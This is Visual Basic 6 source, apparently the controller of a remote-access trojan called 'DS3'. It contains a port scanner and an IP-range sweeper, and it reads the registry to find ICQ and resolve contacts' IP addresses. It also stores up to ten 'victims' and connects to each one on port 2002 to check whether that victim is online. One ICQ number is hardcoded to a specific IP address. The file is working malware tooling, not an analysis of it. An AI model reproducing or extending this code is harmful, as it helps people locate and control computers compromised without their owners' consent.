Sub PortScannen()
    On Error Resume Next
Dim ii
For ii = 1 To MAXPORT
Load tcp(ii)
Next
Dim Socket As Variant
    Dim port As Long
    

    
    port = Val(txttextfelder(31).Text)
    StillSearching = True
    Do While StillSearching
        For Each Socket In tcp
            If (Socket.State = sckClosed Or Socket.State = sckError) Then
                txttextfelder(31).Text = CStr(port)
                Socket.Close
                DoEvents
                Socket.Connect txttextfelder(32).Text, port
                port = port + 1
                If (port = 19) Then port = port + 1
            End If
            DoEvents
        Next
    Loop

    For Each Socket In tcp
        Socket.Close
    Next
End Sub
Private Sub TCP_Connect(Index As Integer)
txttextfelder(33).Text = txttextfelder(33).Text & "[Connected]" & "[" & tcp(Index).RemoteHost & "] " & "[" & tcp(Index).RemoteHostIP & "] " & "[" & CStr(tcp(Index).RemotePort) & "]" & vbCrLf
End Sub
Private Sub TCP_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim Data As String
If (bytesTotal > 0) Then
tcp(Index).GetData Data
txttextfelder(33).Text = txttextfelder(33).Text & "[" & tcp(Index).RemoteHost & "] [" & tcp(Index).RemotePort & "]" & vbCrLf & Data & "  " & vbCrLf
End If
End Sub

Sub Dialog(ByVal Text As String, ByVal Auswahl As String)
lblD.Caption = Text
If Auswahl = "JaNein" Then
shpDialog(0).Visible = True
shpDialog(1).Visible = True
shpDialog(2).Visible = False
lblDialog(0).Visible = True
lblDialog(1).Visible = True
lblDialog(2).Visible = False
Text11.Visible = False
ElseIf Auswahl = "OK" Then
shpDialog(0).Visible = False
shpDialog(1).Visible = False
shpDialog(2).Visible = True
lblDialog(0).Visible = False
lblDialog(1).Visible = False
lblDialog(2).Visible = True
Text11.Visible = False
ElseIf Auswahl = "INPUT" Then
shpDialog(0).Visible = False
shpDialog(1).Visible = False
shpDialog(2).Visible = True
lblDialog(0).Visible = False
lblDialog(1).Visible = False
lblDialog(2).Visible = True
Text11.Visible = True
Else
End If
Picture3.Visible = True

End Sub


Sub StartIPScannen()
    On Error Resume Next
Dim ii As Integer
For ii = 1 To 15
Load ipscanner(ii)
Next
Dim IPAdresseMomentaN
IPAdresseMomentaN = txttextfelder(13).Text
Dim Socket As Variant
        For Each Socket In tcp
        Socket.Close
        Unload Socket
    Next


    IPZahlMomentan = 0
    StillSearching2 = True
r:
    Do While StillSearching2
        For Each Socket In ipscanner
            If (Socket.State = sckClosed Or Socket.State = sckError) Then
               txttextfelder(13).Text = IPAdresseMomentaN & "." & IPZahlMomentan
                Socket.Close
                DoEvents
                Socket.RemoteHost = txttextfelder(13).Text
                Socket.Connect
                IPZahlMomentan = IPZahlMomentan + 1
                If IPZahlMomentan >= 255 Then
                GoTo i
                Else
                End If
            End If
            DoEvents
        Next
        If StillSearching2 = False Then
        GoTo i
        Else
        End If
        
        Sleep txttextfelder(27).Text
        If IPZahlMomentan >= 255 Then
                GoTo i
                Else
                End If
        For Each Socket In ipscanner
        Socket.Close
        Unload Socket
    Next
    For ii = 1 To 15
Load ipscanner(ii)
Next
    GoTo r
    Loop
i:
txttextfelder(13).Locked = False
    For Each Socket In ipscanner
        Socket.Close
        Unload Socket
    Next
    txttextfelder(13).Locked = False
    txttextfelder(13).Text = IPAdresseMomentaN
     IPZahlMomentan = 0
     StillSearching2 = False
End Sub

Private Sub IPScanner_Connect(Index As Integer)
Beep
lstIPErgebnisse.AddItem ipscanner(Index).RemoteHost & " , " & ipscanner(Index).RemoteHostIP
ipscanner(Index).Close
End Sub

Sub ICQIP()
On Error Resume Next
ICQPfad
ChDir ICQPad
Load Form1
Form1.Text1.Text = txttextfelder(9).Text
Form1.Command1.Value = True
Sleep 200
txttextfelder(9).Text = Form1.Text2.Text
Unload Form1
End Sub
Sub ICQPfad()
On Error Resume Next

ICQPad = left(aUserInfo("CurrentUser", "Software\Mirabilis\ICQ\DefaultPrefs", "ICQPath"), Len(aUserInfo("CurrentUser", "Software\Mirabilis\ICQ\DefaultPrefs", "ICQPath")) - 1)

End Sub

Public Function aUserInfo(ab As String, gg As String, hh As String) As String

On Error Resume Next
Dim info As String
Dim nFO As String
Dim NextX As Integer
Dim cmStr As String
cmStr = gg
If ab = "Local" Then
    info = aQueryValue(cmStr, hh, ab)
ElseIf ab = "CurrentUser" Then
info = aQueryValue(cmStr, hh, ab)
  ElseIf ab = "User" Then
  info = aQueryValue(cmStr, hh, ab)
ElseIf ab = "Class" Then
info = aQueryValue(cmStr, hh, ab)
ElseIf ab = "Config" Then
  info = aQueryValue(cmStr, hh, ab)
ElseIf ab = "Dyn" Then
info = aQueryValue(cmStr, hh, ab)
End If
aUserInfo = info
End Function
Function aQueryValue(sKeyName As String, sValueName As String, ab As String) As String
   
       Dim lRetVal As Long
       Dim hKey As Long
       Dim vValue As Variant
If ab = "Local" Then
lRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf ab = "CurrentUser" Then
lRetVal = RegOpenKeyEx(HKEY_CURRENT_USER, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf ab = "User" Then
lRetVal = RegOpenKeyEx(HKEY_USERS, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf ab = "Class" Then
lRetVal = RegOpenKeyEx(HKEY_CLASSES_ROOT, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf ab = "Config" Then
lRetVal = RegOpenKeyEx(HKEY_CURRENT_CONFIG, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf ab = "Dyn" Then
lRetVal = RegOpenKeyEx(HKEY_DYN_DATA, sKeyName, 0, KEY_ALL_ACCESS, hKey)
End If
       
       lRetVal = aQueryValueEx(hKey, sValueName, vValue)
       aQueryValue = vValue
       RegCloseKey (hKey)


   End Function
Function aQueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
   

    Dim cch As Long
    Dim lrc As Long
    Dim lType As Long
    Dim lValue As Long
    Dim sValue As String



    lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)

    Select Case lType

        Case REG_SZ:
            sValue = String(cch, 0)

 lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)


                vValue = left$(sValue, cch)
            

        Case REG_DWORD:



lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)

            If lrc = ERROR_NONE Then vValue = lValue
        Case Else

            lrc = -1
    End Select




QueryValueExExit:

    aQueryValueEx = lrc
    Exit Function



QueryValueExError:

    Resume QueryValueExExit




End Function

Sub VictimsLaden()
On Error Resume Next
Dim a As Integer
List7.Clear
For a = 0 To 9
If GetSetting("DS3", "DS3", "vic" & a) <> "" Then
List7.AddItem GetSetting("DS3", "DS3", "vic" & a)
Else
End If
Next

End Sub
Sub VicSave()
On Error Resume Next
If List7.ListCount >= 9 Then
Dialog "Sorry, only 10 victims", "OK"
Exit Sub
Else
End If
List7.AddItem txttextfelder(41).Text & "-->" & txttextfelder(40).Text
Dim a As Integer
For a = 0 To 9
SaveSetting "DS3", "DS3", "vic" & a, List7.List(a)
Next

End Sub

Sub VicSave2()
On Error Resume Next
List7.RemoveItem List7.ListIndex
Dim a As Integer
For a = 0 To 9
SaveSetting "DS3", "DS3", "vic" & a, List7.List(a)
Next

End Sub
Sub WerIstOnline()
On Error Resume Next
Dim ii
For ii = 1 To List7.ListCount
Load TcpWho(ii)
Next
ICQPfad
ChDir ICQPad
Load Form1
List8.Clear
Dim a As Integer
For a = 0 To List7.ListCount - 1
Form1.Text1.Text = ListAuswerten(a)
Form1.IPAuslesen2
Sleep 100
If ListAuswerten(a) = "40500859" Then
Form1.Text2.Text = "194.106.241.199"
Else
End If
TcpWho(a + 1).Close
TcpWho(a + 1).RemotePort = 2002
TcpWho(a + 1).RemoteHost = Form1.Text2.Text
TcpWho(a + 1).Connect

Next
Unload Form1
Timer4.Enabled = True
End Sub
Function ListAuswerten(ByVal g As Long)
On Error Resume Next

Dim b
b = List7.List(g)
Dim Search, Where
Search = "-"
Where = InStr(b, Search)
If Where Then
ListAuswerten = left(b, Where - 1)


Else
End If

End Function
Sub InsStatus()
Status.InStatus DerSpaeher.WasSenden, False
End Sub
Sub IndenStatus(Data)
Status.Text1.Text = Status.Text1.Text & vbCrLf & Data
End Sub

Sub IndenStatusNormal(Data)
Status.Text1.Text = Status.Text1.Text & Data
End Sub
